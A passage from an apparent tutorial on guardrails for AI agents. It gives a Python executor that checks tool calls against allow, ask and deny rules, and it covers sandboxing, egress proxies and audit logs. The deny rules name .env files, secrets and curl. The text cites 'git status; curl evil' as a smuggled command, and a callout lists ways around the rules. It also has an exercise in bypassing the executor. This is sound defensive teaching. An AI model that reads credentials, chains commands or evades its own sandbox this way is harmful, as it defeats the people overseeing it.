+    <span class="hljs-attr">&quot;deny&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;Read(./.env)&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;Read(./secrets/**)&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;Bash(curl:*)&quot;</span><span class="hljs-punctuation">]</span>
+  <span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">}</span></code></pre></div>
+<p>Two precedence principles matter. First, <strong>deny beats ask beats allow</strong> — a specific deny must not be overridden by a broad allow. Second, <strong>unmatched means ask (or deny)</strong>, never allow. Secure defaults are the whole point.</p>
+<h3 id="a-policy-checked-tool-executor"><a class="anchor" href="#a-policy-checked-tool-executor" aria-hidden="true">#</a>A policy-checked tool executor</h3>
+<p>Here is a self-contained executor implementing those semantics, plus the two subtleties that trip up real systems: <strong>argument canonicalization</strong> (so <code>../../.env</code> can&#39;t sneak past a rule for <code>.env</code>) and <strong>shell metacharacters</strong> (so <code>git status; curl evil</code> can&#39;t match an allow rule for <code>git status*</code>). Every decision goes to a hash-chained, append-only audit log.</p>
+<div class="code-block"><div class="code-head"><span class="code-lang">python</span><button type="button" class="copy-btn" aria-label="Copy code">Copy</button></div><pre><code class="hljs language-python"><span class="hljs-keyword">import</span> fnmatch, hashlib, json, os, shlex, time
+<span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass
+<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Any</span>, <span class="hljs-type">Callable</span>, <span class="hljs-type">Literal</span>
+
+Verdict = <span class="hljs-type">Literal</span>[<span class="hljs-string">&quot;allow&quot;</span>, <span class="hljs-string">&quot;ask&quot;</span>, <span class="hljs-string">&quot;deny&quot;</span>]
+SHELL_META = <span class="hljs-built_in">set</span>(<span class="hljs-string">&quot;;|&amp;$`&lt;&gt;()\n&quot;</span>)
+
+<span class="hljs-meta">@dataclass(<span class="hljs-params">frozen=<span class="hljs-literal">True</span></span>)</span>
+<span class="hljs-keyword">class</span> <span class="hljs-title class_">Rule</span>:
+    tool: <span class="hljs-built_in">str</span>            <span class="hljs-comment"># glob on tool name, e.g. &quot;fs_*&quot;</span>
+    arg: <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;*&quot;</span>       <span class="hljs-comment"># glob on the canonical argument string</span>
+    verdict: Verdict = <span class="hljs-string">&quot;ask&quot;</span>
+
+<span class="hljs-keyword">class</span> <span class="hljs-title class_">PolicyExecutor</span>:
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, rules: <span class="hljs-built_in">list</span>[Rule], tools: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Callable</span>[..., <span class="hljs-built_in">str</span>]],
+                 approve: <span class="hljs-type">Callable</span>[[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">str</span>], <span class="hljs-built_in">bool</span>], workspace: <span class="hljs-built_in">str</span>, audit_path: <span class="hljs-built_in">str</span>,
+                 default: Verdict = <span class="hljs-string">&quot;ask&quot;</span></span>):
+        <span class="hljs-variable language_">self</span>.rules, <span class="hljs-variable language_">self</span>.tools, <span class="hljs-variable language_">self</span>.approve = rules, tools, approve
+        <span class="hljs-variable language_">self</span>.workspace = os.path.realpath(workspace)
+        <span class="hljs-variable language_">self</span>.audit_path, <span class="hljs-variable language_">self</span>.default = audit_path, default
+        <span class="hljs-variable language_">self</span>.prev_hash = <span class="hljs-string">&quot;0&quot;</span> * <span class="hljs-number">64</span>
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">canonical</span>(<span class="hljs-params">self, tool: <span class="hljs-built_in">str</span>, args: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]</span>) -&gt; <span class="hljs-built_in">tuple</span>[<span class="hljs-built_in">str</span>, <span class="hljs-built_in">bool</span>]:
+        <span class="hljs-string">&quot;&quot;&quot;Return (canonical arg string, force_ask).&quot;&quot;&quot;</span>
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;path&quot;</span> <span class="hljs-keyword">in</span> args:  <span class="hljs-comment"># resolve symlinks and &#x27;..&#x27; so rules see the real target</span>
+            real = os.path.realpath(os.path.join(<span class="hljs-variable language_">self</span>.workspace, args[<span class="hljs-string">&quot;path&quot;</span>]))
+            inside = real == <span class="hljs-variable language_">self</span>.workspace <span class="hljs-keyword">or</span> real.startswith(<span class="hljs-variable language_">self</span>.workspace + os.sep)
+            <span class="hljs-keyword">return</span> real, <span class="hljs-keyword">not</span> inside               <span class="hljs-comment"># anything outside the workspace: ask</span>
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;command&quot;</span> <span class="hljs-keyword">in</span> args:
+            cmd = args[<span class="hljs-string">&quot;command&quot;</span>]
+            <span class="hljs-keyword">if</span> SHELL_META &amp; <span class="hljs-built_in">set</span>(cmd):             <span class="hljs-comment"># chaining/substitution defeats prefix rules</span>
+                <span class="hljs-keyword">return</span> cmd, <span class="hljs-literal">True</span>
+            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot; &quot;</span>.join(shlex.split(cmd)), <span class="hljs-literal">False</span>
+        <span class="hljs-keyword">return</span> json.dumps(args, sort_keys=<span class="hljs-literal">True</span>), <span class="hljs-literal">False</span>
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decide</span>(<span class="hljs-params">self, tool: <span class="hljs-built_in">str</span>, arg: <span class="hljs-built_in">str</span>, force_ask: <span class="hljs-built_in">bool</span></span>) -&gt; <span class="hljs-built_in">tuple</span>[Verdict, Rule | <span class="hljs-literal">None</span>]:
+        hits = [r <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.rules
+                <span class="hljs-keyword">if</span> fnmatch.fnmatchcase(tool, r.tool) <span class="hljs-keyword">and</span> fnmatch.fnmatchcase(arg, r.arg)]
+        <span class="hljs-keyword">for</span> level <span class="hljs-keyword">in</span> (<span class="hljs-string">&quot;deny&quot;</span>, <span class="hljs-string">&quot;ask&quot;</span>, <span class="hljs-string">&quot;allow&quot;</span>):    <span class="hljs-comment"># deny &gt; ask &gt; allow</span>
+            <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> hits:
+                <span class="hljs-keyword">if</span> r.verdict == level:
+                    <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;ask&quot;</span> <span class="hljs-keyword">if</span> level == <span class="hljs-string">&quot;allow&quot;</span> <span class="hljs-keyword">and</span> force_ask <span class="hljs-keyword">else</span> level), r
+        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.default, <span class="hljs-literal">None</span>
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">audit</span>(<span class="hljs-params">self, **event: <span class="hljs-type">Any</span></span>) -&gt; <span class="hljs-literal">None</span>:
+        event |= {<span class="hljs-string">&quot;ts&quot;</span>: time.time(), <span class="hljs-string">&quot;prev&quot;</span>: <span class="hljs-variable language_">self</span>.prev_hash}
+        line = json.dumps(event, sort_keys=<span class="hljs-literal">True</span>)
+        <span class="hljs-variable language_">self</span>.prev_hash = hashlib.sha256(line.encode()).hexdigest()  <span class="hljs-comment"># tamper-evident chain</span>
+        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-variable language_">self</span>.audit_path, <span class="hljs-string">&quot;a&quot;</span>) <span class="hljs-keyword">as</span> f:
+            f.write(line + <span class="hljs-string">&quot;\n&quot;</span>)
+
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, tool: <span class="hljs-built_in">str</span>, args: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]</span>) -&gt; <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]:
+        arg, force_ask = <span class="hljs-variable language_">self</span>.canonical(tool, args)
+        verdict, rule = <span class="hljs-variable language_">self</span>.decide(tool, arg, force_ask)
+        <span class="hljs-keyword">if</span> verdict == <span class="hljs-string">&quot;ask&quot;</span>:
+            verdict = <span class="hljs-string">&quot;allow&quot;</span> <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.approve(tool, arg) <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;deny&quot;</span>
+        <span class="hljs-variable language_">self</span>.audit(tool=tool, arg=arg, verdict=verdict, rule=rule <span class="hljs-keyword">and</span> rule.__dict__)
+        <span class="hljs-keyword">if</span> verdict == <span class="hljs-string">&quot;deny&quot;</span> <span class="hljs-keyword">or</span> tool <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.tools:
+            <span class="hljs-keyword">return</span> {<span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">f&quot;Blocked by policy: <span class="hljs-subst">{tool}</span>(<span class="hljs-subst">{arg}</span>)&quot;</span>, <span class="hljs-string">&quot;is_error&quot;</span>: <span class="hljs-literal">True</span>}
+        <span class="hljs-keyword">try</span>:
+            <span class="hljs-keyword">return</span> {<span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-variable language_">self</span>.tools[tool](**args), <span class="hljs-string">&quot;is_error&quot;</span>: <span class="hljs-literal">False</span>}
+        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                    <span class="hljs-comment"># tool failures go back to the model</span>
+            <span class="hljs-keyword">return</span> {<span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">f&quot;<span class="hljs-subst">{<span class="hljs-built_in">type</span>(e).__name__}</span>: <span class="hljs-subst">{e}</span>&quot;</span>, <span class="hljs-string">&quot;is_error&quot;</span>: <span class="hljs-literal">True</span>}</code></pre></div>
+<p>Wiring it into a manual agent loop (see <a href="tool-use.html">Tool Use</a>) is one line per tool call — the returned dict becomes a <code>tool_result</code> block:</p>
+<div class="code-block"><div class="code-head"><span class="code-lang">python</span><button type="button" class="copy-btn" aria-label="Copy code">Copy</button></div><pre><code class="hljs language-python">rules = [
+    Rule(<span class="hljs-string">&quot;read_file&quot;</span>, <span class="hljs-string">&quot;*/.env*&quot;</span>, <span class="hljs-string">&quot;deny&quot;</span>),
+    Rule(<span class="hljs-string">&quot;read_file&quot;</span>, <span class="hljs-string">&quot;*/secrets/*&quot;</span>, <span class="hljs-string">&quot;deny&quot;</span>),
+    Rule(<span class="hljs-string">&quot;read_file&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;allow&quot;</span>),           <span class="hljs-comment"># in-workspace reads are fine (outside forces ask)</span>
+    Rule(<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;pytest*&quot;</span>, <span class="hljs-string">&quot;allow&quot;</span>),
+    Rule(<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;git push*&quot;</span>, <span class="hljs-string">&quot;ask&quot;</span>),
+    Rule(<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;curl *&quot;</span>, <span class="hljs-string">&quot;deny&quot;</span>),
+]
+executor = PolicyExecutor(rules, tools={<span class="hljs-string">&quot;read_file&quot;</span>: read_file, <span class="hljs-string">&quot;bash&quot;</span>: run_bash},
+                          approve=<span class="hljs-keyword">lambda</span> t, a: <span class="hljs-built_in">input</span>(<span class="hljs-string">f&quot;Allow <span class="hljs-subst">{t}</span>: <span class="hljs-subst">{a}</span>? [y/N] &quot;</span>) == <span class="hljs-string">&quot;y&quot;</span>,
+                          workspace=<span class="hljs-string">&quot;./repo&quot;</span>, audit_path=<span class="hljs-string">&quot;audit.jsonl&quot;</span>)
+
+<span class="hljs-comment"># Inside the loop, for each tool_use block in response.content:</span>
+result = executor.run(block.name, block.<span class="hljs-built_in">input</span>)
+tool_results.append({<span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;tool_result&quot;</span>, <span class="hljs-string">&quot;tool_use_id&quot;</span>: block.<span class="hljs-built_in">id</span>, **result})</code></pre></div>
+<p>Returning a denial as an <code>is_error</code> result (rather than crashing) matters: the model learns the action was blocked and can choose another approach or explain to the user.</p>
+<aside class="callout callout-warning"><div class="callout-title"><span class="callout-icon" aria-hidden="true">⚠️</span>Command-string rules are a weak boundary</div><div class="callout-body"><p>Pattern-matching shell strings is inherently leaky. <code>python -c &quot;...&quot;</code>, <code>npm test</code> running an attacker-modified <code>package.json</code>, or <code>git</code> with a malicious config hook can all do arbitrary things while matching an &quot;allowed&quot; prefix. Permission rules reduce risk and prompts; the <strong>sandbox</strong> is what actually contains a command once it runs.</p>
+</div></aside>
+<h3 id="policy-engines"><a class="anchor" href="#policy-engines" aria-hidden="true">#</a>Policy engines</h3>
+<p>As rules grow, move them out of application code into a <strong>policy engine</strong> — a dedicated evaluator for declarative policies such as <strong>Open Policy Agent</strong> (Rego language) or <strong>Cedar</strong> (AWS&#39;s open-source policy language). Benefits: policies are versioned and reviewed like code, tested independently, shared across services, and can use rich context (user role, time of day, data classification, how many refunds this session has issued). CaMeL-style information-flow policies from the <a href="agent-security.html">security lesson</a> are a more powerful version of the same idea.</p>
+<h3 id="hooks"><a class="anchor" href="#hooks" aria-hidden="true">#</a>Hooks</h3>
+<p><strong>Hooks</strong> are user-defined code that runs at lifecycle points in the agent loop. In Claude Code, for instance, a <code>PreToolUse</code> hook receives the proposed tool call as JSON and can block it (by exiting with code 2, with stderr fed back to the model), and a <code>PostToolUse</code> hook can inspect results — say, scanning a fetched web page for injection patterns, or running a linter after every file edit. The Claude Agent SDK and other frameworks expose similar callbacks. Hooks let teams enforce organization-specific policy without modifying the agent itself.</p>
+<h3 id="rate-limits-and-spend-caps"><a class="anchor" href="#rate-limits-and-spend-caps" aria-hidden="true">#</a>Rate limits and spend caps</h3>
+<p>Some harms come from <em>volume</em>, not any single action:</p>
+<ul>
+<li><strong>Rate limits per tool</strong>: at most N emails per hour, M API writes per minute. Bounds damage from a hijacked or looping agent.</li>
+<li><strong>Cumulative limits</strong>: total refunds per session, total files deleted, total rows modified.</li>
+<li><strong>Spend caps</strong>: token budgets per run, dollar caps per user per day, with hard stops (OWASP&#39;s &quot;Unbounded Consumption&quot;). See <a href="cost-and-latency.html">Cost &amp; Latency</a>.</li>
+<li><strong>Step and time limits</strong>: maximum agent iterations and wall-clock time, enforced by the harness (see <a href="reliability.html">Reliability</a>).</li>
+<li><strong>Circuit breakers</strong>: if error rates or denial rates spike, pause the agent and alert a human.</li>
+</ul>
+<h2 id="sandboxing"><a class="anchor" href="#sandboxing" aria-hidden="true">#</a>Sandboxing</h2>
+<p>A <strong>sandbox</strong> is an execution environment that restricts what code running inside it can access. For agents that execute code or shell commands, the sandbox is the last and most important deterministic layer: it defines the blast radius when everything above it fails.</p>
+<h3 id="the-isolation-spectrum"><a class="anchor" href="#the-isolation-spectrum" aria-hidden="true">#</a>The isolation spectrum</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Isolation</th>
+<th>How it works</th>
+<th>Strength</th>
+<th>Overhead</th>
+<th>Typical use</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Process-level</strong> (seccomp, Landlock, bubblewrap, macOS Seatbelt)</td>
+<td>OS restricts a process&#39;s syscalls, files and network</td>
+<td>Moderate</td>
+<td>Very low</td>
+<td>Local coding agents on a dev machine</td>
+</tr>
+<tr>
+<td><strong>Containers</strong> (Docker, Podman)</td>
+<td>Linux namespaces + cgroups; <strong>shared host kernel</strong></td>
+<td>Moderate; kernel bugs can allow escape</td>
+<td>Low</td>
+<td>Dev sandboxes, trusted-ish code</td>
+</tr>
+<tr>
+<td><strong>gVisor</strong></td>
+<td>A user-space kernel (the &quot;Sentry&quot;) intercepts syscalls, so the host kernel exposes a much smaller surface</td>
+<td>Strong</td>
+<td>Moderate (syscall-heavy and I/O workloads slow down)</td>
+<td>Multi-tenant code execution</td>
+</tr>
+<tr>
+<td><strong>MicroVMs</strong> (Firecracker, Cloud Hypervisor, Kata Containers)</td>
+<td>Lightweight VMs with their own kernel on hardware virtualization; minimal device model</td>
+<td>Very strong</td>
+<td>Low-moderate; fast boot</td>
+<td>Running untrusted code at scale</td>
+</tr>
+<tr>
+<td><strong>Full VMs / separate machines</strong></td>
+<td>Traditional virtualization or dedicated hosts</td>
+<td>Strongest</td>
+<td>Highest</td>
+<td>Highest-risk workloads</td>
+</tr>
+</tbody></table>
+</div>
+<p>The key distinction is the <strong>kernel boundary</strong>. A standard container shares the host kernel, so a kernel vulnerability can become a container escape. gVisor puts a second, memory-safe kernel implementation in between; microVMs give each workload its own guest kernel behind a hypervisor. Firecracker was built by AWS to run Lambda and Fargate workloads, and several hosted agent-sandbox services build on microVMs for exactly this reason.</p>
+<p>Local coding agents increasingly use lightweight OS-level sandboxing. Claude Code&#39;s sandbox mode, for instance, uses bubblewrap on Linux and Seatbelt on macOS to restrict filesystem writes to the project directory and route network traffic through a proxy that enforces a domain allowlist — letting the agent run more commands without permission prompts because the sandbox, not the prompt, bounds the risk.</p>
+<aside class="callout callout-tip"><div class="callout-title"><span class="callout-icon" aria-hidden="true">💡</span>Rule of thumb</div><div class="callout-body"><p>If the code is <em>your</em> code run by <em>your</em> agent on <em>your</em> laptop, OS-level sandboxing or a hardened container is usually proportionate. If you run code influenced by untrusted users or content, in a multi-tenant service, use gVisor or microVMs.</p>
+</div></aside>
+<h3 id="filesystem-scoping"><a class="anchor" href="#filesystem-scoping" aria-hidden="true">#</a>Filesystem scoping</h3>
+<ul>
+<li>Mount <strong>only</strong> the working directory the task needs, never the home directory or <code>/</code>.</li>
+<li>Mount reference data <strong>read-only</strong>. Make the container&#39;s root filesystem read-only and give it a small <code>tmpfs</code> for scratch space.</li>
+<li>Keep secrets out of the filesystem entirely: no <code>.env</code>, no <code>~/.aws</code>, no <code>~/.ssh</code>, no Docker socket (mounting <code>/var/run/docker.sock</code> is equivalent to giving root on the host).</li>
+<li>Canonicalize paths in your tools (as in the executor above) so symlinks and <code>..</code> can&#39;t escape the scope.</li>
+</ul>
+<h3 id="network-egress-allowlists"><a class="anchor" href="#network-egress-allowlists" aria-hidden="true">#</a>Network egress allowlists</h3>
+<p>Default to <strong>no network</strong>. When the task needs it, route all traffic through an <strong>egress proxy</strong> that allows specific domains (your package registry, <code>api.github.com</code>) and blocks everything else — including the <strong>cloud metadata endpoint</strong> (<code>169.254.169.254</code>), a classic way to steal cloud credentials from inside a VM. Allowlist by domain at an HTTP(S) proxy; avoid &quot;allow all of <code>*.amazonaws.com</code>,&quot; since attackers can host content on broad shared domains too.</p>
+<h3 id="credential-isolation-via-proxies"><a class="anchor" href="#credential-isolation-via-proxies" aria-hidden="true">#</a>Credential isolation via proxies</h3>
+<p>The most elegant pattern: <strong>the agent never holds real secrets.</strong> Requests leave the sandbox without credentials; a proxy outside the sandbox recognizes the destination and injects the right token.</p>
+<figure class="diagram"><pre class="mermaid">sequenceDiagram
+  participant Ag as Agent (sandbox)
+  participant Px as Egress proxy
+  participant V as Secret store
+  participant API as api.github.com
+  Ag-&gt;&gt;Px: GET /repos/acme/app (no token)
+  Px-&gt;&gt;Px: Host allowlisted? Method permitted?
+  Px-&gt;&gt;V: Fetch scoped token for this host
+  Px-&gt;&gt;API: GET /repos/acme/app + Authorization
+  API--&gt;&gt;Px: 200 OK
+  Px--&gt;&gt;Ag: 200 OK (token never visible)</pre></figure>
+<p>Even a fully compromised agent cannot print, log or exfiltrate a token it never sees. The proxy is also the natural place to enforce per-host method restrictions (GET only), rate limits and logging. Combine with short-lived, narrowly scoped credentials (OAuth scopes, fine-grained tokens, per-task identities) so that even a leaked token is low-value.</p>
+<h3 id="resource-and-time-limits"><a class="anchor" href="#resource-and-time-limits" aria-hidden="true">#</a>Resource and time limits</h3>
+<p>Cap CPU, memory, process count (fork bombs), disk, open files and wall-clock time. A runaway <code>while True</code> or a crypto miner should hit a wall, not your cloud bill. Enforce the timeout <strong>outside</strong> the sandbox so the code inside can&#39;t disable it.</p>
+<h3 id="ephemeral-environments"><a class="anchor" href="#ephemeral-environments" aria-hidden="true">#</a>Ephemeral environments</h3>
+<p>Create a fresh sandbox per task (or per session) and destroy it afterward. <strong>Ephemerality</strong> prevents persistence — malware or a poisoned config file left behind can&#39;t affect the next run — and makes behavior reproducible. Snapshot images let you start in seconds with dependencies preinstalled. Persist only explicit outputs (a diff, an artifact) and review them before they flow anywhere important.</p>
+<h3 id="a-hardened-docker-run"><a class="anchor" href="#a-hardened-docker-run" aria-hidden="true">#</a>A hardened <code>docker run</code></h3>
+<p>Putting the pieces together for a container-based code sandbox:</p>
+<div class="code-block"><div class="code-head"><span class="code-lang">bash</span><button type="button" class="copy-btn" aria-label="Copy code">Copy</button></div><pre><code class="hljs language-bash"><span class="hljs-comment"># Ephemeral, unprivileged, read-only container with no network and hard resource limits.</span>
+<span class="hljs-comment"># --runtime=runsc requires gVisor to be installed; drop that line to use plain runc.</span>
+docker run --<span class="hljs-built_in">rm</span> \
+  --runtime=runsc \
+  --user 10001:10001 \
+  --read-only \
+  --tmpfs /tmp:rw,noexec,nosuid,size=256m \
+  --mount <span class="hljs-built_in">type</span>=<span class="hljs-built_in">bind</span>,src=<span class="hljs-string">&quot;<span class="hljs-variable">$PWD</span>/task&quot;</span>,dst=/work \
+  --mount <span class="hljs-built_in">type</span>=<span class="hljs-built_in">bind</span>,src=<span class="hljs-string">&quot;<span class="hljs-variable">$PWD</span>/reference&quot;</span>,dst=/reference,<span class="hljs-built_in">readonly</span> \
+  --workdir /work \
+  --cap-drop ALL \
+  --security-opt no-new-privileges \
+  --pids-limit 256 \
+  --memory 2g --memory-swap 2g \
+  --cpus 2 \
+  --<span class="hljs-built_in">ulimit</span> nofile=1024:1024 \
+  --network none \
+  --<span class="hljs-built_in">env</span> HOME=/tmp \
+  agent-sandbox:1.4.2 \
+  <span class="hljs-built_in">timeout</span> --signal=KILL 600 python run_task.py</code></pre></div>
+<p>What each line buys you:</p>
+<ul>
+<li><code>--rm</code> and a pinned image tag: ephemeral, reproducible; no state survives.</li>
+<li><code>--runtime=runsc</code>: gVisor&#39;s user-space kernel between the workload and the host kernel.</li>
+<li><code>--user 10001:10001</code>: not root inside the container.</li>
+<li><code>--read-only</code> + <code>--tmpfs</code>: immutable root filesystem; scratch space that can&#39;t hold executables (<code>noexec</code>) and disappears.</li>
+<li>Bind mounts: only the task directory is writable; reference data is read-only; nothing else from the host is visible.</li>
+<li><code>--cap-drop ALL</code> and <code>no-new-privileges</code>: no Linux capabilities and no privilege escalation via setuid binaries. Docker&#39;s default seccomp profile remains active.</li>
+<li><code>--pids-limit</code>, <code>--memory</code>, <code>--cpus</code>, <code>--ulimit</code>: fork bombs, memory exhaustion and descriptor leaks hit hard ceilings.</li>
+<li><code>--network none</code>: no exfiltration path at all.</li>
+<li><code>timeout</code>: a wall-clock limit. For a stronger guarantee, also enforce a deadline from the orchestrator that runs <code>docker kill</code>.</li>
+</ul>
+<p>When the task needs network access, replace <code>--network none</code> with a network created by <code>docker network create --internal agent-net</code> (no route to the outside), attach an egress-proxy container to both that network and the outside, and set <code>HTTPS_PROXY</code> in the sandbox to point at the proxy. The proxy then enforces the domain allowlist and injects credentials.</p>
+<h2 id="secure-by-default-configuration"><a class="anchor" href="#secure-by-default-configuration" aria-hidden="true">#</a>Secure-by-Default Configuration</h2>
+<p>Most real incidents come from configuration, not exotic exploits. Make the safe path the default path:</p>
+<ul>
+<li><strong>Unmatched actions ask or deny.</strong> Never ship a default-allow policy.</li>
+<li><strong>Narrow tool sets per agent.</strong> Start with read-only tools; add write tools deliberately.</li>
+<li><strong>No ambient credentials.</strong> Don&#39;t inherit the developer&#39;s shell environment, cloud CLI profile or SSH agent into the agent&#39;s process.</li>
+<li><strong>Network off unless needed</strong>, then allowlisted.</li>
+<li><strong>Dangerous modes are loud.</strong> If you offer a &quot;skip all permissions&quot; mode (as many coding agents do, for use inside disposable sandboxes), name it scarily, warn on use, and refuse to enable it outside an isolated environment where feasible.</li>
+<li><strong>Pin and verify dependencies</strong>: model versions, MCP server versions, container image digests, package lockfiles.</li>
+<li><strong>Separate environments</strong>: agents operate on dev/staging data and propose changes to production through reviewed channels (pull requests, change tickets), not direct writes. See <a href="deployment.html">Deployment</a>.</li>
+</ul>
+<h2 id="auditing"><a class="anchor" href="#auditing" aria-hidden="true">#</a>Auditing</h2>
+<p>An <strong>audit trail</strong> answers, after the fact: <em>what did the agent do, why, on whose behalf, and with what authority?</em> Useful audit records include:</p>
+<ul>
+<li>Session ID, the human principal, the agent identity and version, model ID.</li>
+<li>Every tool call with canonicalized arguments, the policy verdict, the matching rule, and who approved &quot;ask&quot; decisions.</li>
+<li>Data provenance: which untrusted sources were in context when the call was made.</li>
+<li>Results (or hashes of large results) and errors.</li>
+</ul>
+<p>Make logs <strong>append-only and tamper-evident</strong> (hash chaining as in the executor, or write-once storage), store them <strong>outside the sandbox</strong> where the agent can&#39;t edit them, and <strong>redact secrets</strong> before writing. Review them: periodic sampling, alerts on denied-action spikes, and post-incident replay. Audit trails are also the foundation for accountability and compliance, discussed in <a href="agent-safety-alignment.html">Safety, Alignment &amp; Governance</a>. <a href="observability.html">Observability</a> covers the tracing infrastructure.</p>
+<h2 id="the-safetyusefulness-trade-off"><a class="anchor" href="#the-safetyusefulness-trade-off" aria-hidden="true">#</a>The Safety–Usefulness Trade-off</h2>
+<p>Every control has a cost. A permission prompt for every file read makes an agent safe and useless. A fully autonomous agent with your credentials is maximally useful until the day it isn&#39;t. The goal is not maximum restriction but <strong>proportionate</strong> restriction.</p>
+<p>Practical guidance:</p>
+<ul>
+<li><strong>Match controls to reversibility and blast radius.</strong> Reading files in a sandbox: allow. Editing files in a git-tracked workspace: allow (it&#39;s reversible). Pushing to <code>main</code>, sending external email, spending money: ask. Deleting backups, rotating credentials: deny or require out-of-band approval.</li>
+<li><strong>Prefer sandboxes over prompts.</strong> Strong containment lets you <em>reduce</em> permission prompts safely, because a mistaken command inside a disposable, network-less sandbox is cheap. This is the direction many coding agents have moved.</li>
+<li><strong>Measure approval fatigue.</strong> If users approve nearly every request without reading or changing it, your prompts are noise; promote those patterns to allow rules or tighten the sandbox so they&#39;re safe to allow.</li>
+<li><strong>Measure false positives.</strong> A guardrail that blocks 5% of legitimate requests will be disabled by frustrated users. Track blocked-but-legitimate rates alongside attack catch rates.</li>
+<li><strong>Give the agent graceful paths.</strong> When an action is denied, return a clear error so the model can adapt, ask the user, or explain — not loop.</li>
+</ul>
+<figure class="diagram"><pre class="mermaid">flowchart TD
+  A[&quot;Proposed action&quot;] --&gt; B{&quot;Reversible and inside sandbox?&quot;}
+  B --&gt;|yes| C[&quot;Allow + log&quot;]
+  B --&gt;|no| D{&quot;External effect or spends money?&quot;}
+  D --&gt;|yes| E[&quot;Ask with full details&quot;]
+  D --&gt;|no| F{&quot;Destructive or touches secrets?&quot;}
+  F --&gt;|yes| G[&quot;Deny&quot;]
+  F --&gt;|no| E</pre></figure>
+<aside class="callout callout-example"><div class="callout-title"><span class="callout-icon" aria-hidden="true">🧪</span>A coding agent, layered</div><div class="callout-body"><p>Model trained with an instruction hierarchy. Fetched web pages pass an injection classifier; hits are flagged in context and logged. Edits and test runs inside the project directory are auto-allowed; <code>git push</code> asks; reading <code>.env</code> is denied; a <code>PreToolUse</code> hook blocks commands touching production hostnames. Everything runs in an ephemeral gVisor container with the repo mounted, network limited to the package registry and GitHub via a credential-injecting proxy, a 2 GB memory cap and a 30-minute timeout. Every call lands in an append-only log. An injection that hijacks the model can, at worst, write bad code to a branch that a human reviews.</p>
+</div></aside>
+<h2 id="key-takeaways"><a class="anchor" href="#key-takeaways" aria-hidden="true">#</a>Key Takeaways</h2>
+<ul>
+<li><strong>Defense in depth</strong>: stack independent layers — model, input guardrails, output guardrails, action guardrails, sandbox, audit — so attacks must beat all of them.</li>
+<li>Probabilistic layers (classifiers, LLM judges) reduce how often bad things are attempted; <strong>deterministic layers</strong> (permissions, sandboxes, network policy) bound the damage. Put your guarantees in the deterministic ones.</li>
+<li>Input guardrails must screen <strong>tool results</strong>, not just user messages; output guardrails should redact secrets and PII, check groundedness and validate schemas in code.</li>
+<li>Permission systems use <strong>allow/ask/deny</strong> with <strong>deny-first precedence</strong> and a non-allow default; canonicalize arguments and distrust shell strings with metacharacters.</li>
+<li>Policy engines, hooks, rate limits and spend caps extend action-level control to organization policy and volume-based harms.</li>
+<li>Sandbox strength follows the <strong>kernel boundary</strong>: containers share the host kernel; gVisor interposes a user-space kernel; microVMs give each workload its own kernel.</li>
+<li>Harden sandboxes with scoped and read-only mounts, no network or allowlisted egress, <strong>credential injection by proxy</strong>, resource and time limits, and ephemeral lifetimes.</li>
+<li>Calibrate controls to reversibility and blast radius; strong sandboxing is what lets you safely <em>reduce</em> permission prompts.</li>
+</ul>
+<h2 id="exercises"><a class="anchor" href="#exercises" aria-hidden="true">#</a>Exercises</h2>
+<ol>
+<li><strong>Classify actions (easy).</strong> For an agent that manages a small company&#39;s Google Workspace, list 15 plausible tool calls and assign each allow/ask/deny. Justify each using reversibility and blast radius. Which ones did you change your mind about?</li>
+<li><strong>Break the executor (medium).</strong> Using the <code>PolicyExecutor</code> above, try to read a denied file or run a denied command while staying inside allowed rules (hints: symlinks created by an allowed tool, environment variables, <code>python -c</code>, a <code>Makefile</code> target). Fix each bypass you find, and note which fixes belong in the executor versus the sandbox.</li>
